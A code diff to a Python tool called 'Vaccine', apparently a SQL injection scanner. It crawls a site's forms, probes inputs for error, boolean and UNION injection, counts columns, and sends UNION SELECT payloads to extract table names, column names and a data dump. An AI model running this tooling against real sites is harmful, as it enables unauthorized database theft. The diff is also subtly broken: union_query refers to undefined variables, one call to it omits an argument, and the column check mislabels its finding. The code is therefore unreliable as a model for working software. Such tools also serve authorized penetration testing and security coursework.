@@ -92,6 +92,27 @@ class Vaccine:
         elif self.request == 'POST':
             return self.session.post(url, data=data)
 
+    def union_query(self, input, select_query, from_query=""):
+        ''' Build UNION Query based on the number of columns found '''
+        cols = ['NULL'] * input['col']
+        cols[0] = select_expr
+        payload = f"' UNION SELECT {', '.join(cols)} {from_clause}-- "
+        return payload
+
+    def run_query(self, form, select_query, from_query):
+        ''' Run a query on vulnerable input '''
+        for input in form.inputs:
+            if "error" in input['vul'] or "union" in input['vul']:
+                data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
+                payload =  self.union_query(input, select_query, from_query)
+                print(payload) # DEV
+                data[input['name']] = payload
+                try:
+                    return self.send(form.url, data).text
+                except:
+                    return None
+        return None
+
     def get_forms(self, url, depth):
         ''' Get all the forms from the url and crawl to set depth '''
 
@@ -117,11 +138,14 @@ class Vaccine:
 
         # Scrap all the links in the page
         if depth > 0:
-          for link in soup.find_all('a', href=True):
-            href = link['href']
-            if not href.startswith(("#", "mailto:", "javascript")):
-                link_url = urllib.parse.urljoin(url, href)
-                self.get_forms(link_url, depth - 1)
+            base_domain = urllib.parse.urlparse(self.url).netloc
+            for link in soup.find_all('a', href=True):
+                href = link['href']
+                if not href.startswith(("#", "mailto:", "javascript")):
+                    link_url = urllib.parse.urljoin(url, href)
+                    link_domain = urllib.parse.urlparse(link_url).netloc
+                    if link_domain == base_domain:
+                        self.get_forms(link_url, depth - 1)
 
     def check_all_inputs(self, form, query):
         ''' Check the query with all inputs of the form'''
@@ -134,6 +158,31 @@ class Vaccine:
                 if idx == i:
                     target = inp['name']
                     data[inp['name']] = query
+                else:
+                    data[inp['name']] = inp['value'] or 'test'
+            try:
+                res = self.send(form.url, data)
+                responses.append({
+                    'input': target,
+                    'response': res
+                })
+            except Exception as e:
+                self.add_report(f"Form submission failed for {form.url}: {e}")
+                return responses
+            i += 1
+        return responses
+    
+    def union_all_inputs(self, form, test):
+        ''' Check the query with all inputs of the form'''
+        responses = []
+
+        i = 0
+        while i < len(form.inputs):
+            data = {}
+            for idx, inp in enumerate(form.inputs):
+                if idx == i:
+                    target = inp['name']
+                    data[inp['name']] = self.union_query(inp, test)
                 else:
                     data[inp['name']] = inp['value'] or 'test'
             try:
@@ -185,25 +234,35 @@ class Vaccine:
                         if inp['name'] == true_res['input']:
                             inp['vul'].append("boolean")
                             break
-        # Union
-        for idx, union_query in enumerate(Query.checks['union']):
+        # Columns count
+        for i in range(1, 11):
+            query = Query.checks['columns'][0].format(i)
             for form in self.forms:
-                responses = self.check_all_inputs(form, union_query)
+                responses = self.check_all_inputs(form, query)
                 for res in responses:
-                    error_detected = False
-                    for engine, msg in Query.errors.items():
-                        if msg.lower() in res['response'].text.lower():
-                            error_detected = True
-                            break
-                    
-                    if not error_detected and res['response'].status_code == 200:
+                    if res['response'].status_code == 500 or "unknown column" in res['response'].text.lower()\
+                            or "ORDER BY" in res['response'].text.lower():
                         form.vul = True
                         self.vul = True
                         for inp in form.inputs:
-                            if inp['name'] == res['input'] and "union" not in inp['vul']:
-                                inp['vul'].append(f"union")
-                                inp['col'] = idx + 1
+                            if inp['name'] == res['input'] and "columns" not in inp['vul']:
+                                inp['vul'].append("error")
+                                inp['col'] = i - 1
                                 break
+
+        # Union
+        test = "'Test12345!'"
+        for form in self.forms:
+            responses = self.union_all_inputs(form, test)
+            for res in responses:
+                if res['response'].status_code == 200\
+                        and test.replace("'", "").lower() in res['response'].text.lower():
+                    form.vul = True
+                    self.vul = True
+                    for inp in form.inputs:
+                        if inp['name'] == res['input'] and "union" not in inp['vul']:
+                            inp['vul'].append(f"union")
+                            break
 
         self.report_vulnerability()
     
@@ -225,8 +284,7 @@ class Vaccine:
                 self.add_report(f"NO VULNERABILITY FOUND\n")
                 continue
             table = PrettyTable()
-            list_check = list(Query.checks.keys())
-            list_check.insert(0, "Input")
+            list_check = ["Input", "error", "boolean", "union"]
             table.field_names = list_check
             for input in form.inputs:
                 row = [input['name']]
@@ -236,21 +294,6 @@ class Vaccine:
                 table.add_row(row)
             self.add_report(str(table))
             self.add_report("\n")
-
-    def run_query(self, form, query):
-        ''' Run a query on vulnerable input '''
-        for input in form.inputs:
-            if "error" in input['vul'] or "union" in input['vul']:
-                cols = [query] + ["NULL"] * (input['col'] - 1)
-                payload = f"' UNION SELECT {', '.join(cols)} -- "
-                data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
-                print(f"Payload: {payload}, col: {input['col']}")  # DEV
-                data[input['name']] = payload
-                try:
-                    return self.send(form.url, data).text
-                except:
-                    return None
-        return None
 
     # def check_version(self):
     #     if not self.vul:
@@ -289,11 +332,14 @@ class Vaccine:
             if not form.vul:
                 continue
             if not tables:
-                tables = self.run_query(form, Query.tables[self.engine])
+                query = Query.tables[self.engine]
+                tables = self.run_query(form, query['select'], query['from'])
             if not columns:
-                columns = self.run_query(form, Query.columns[self.engine])
+                query = Query.columns[self.engine]
+                columns = self.run_query(form, query['select'], query['from'])
             if not dump:
-                dump = self.run_query(form, Query.dump[self.engine])
+                query = Query.dump[self.engine]
+                dump = self.run_query(form, query['select'], query['from'])
         
         self.add_report(f"==> TABLES\n")
         # tables = self.parse_extraction(tables)
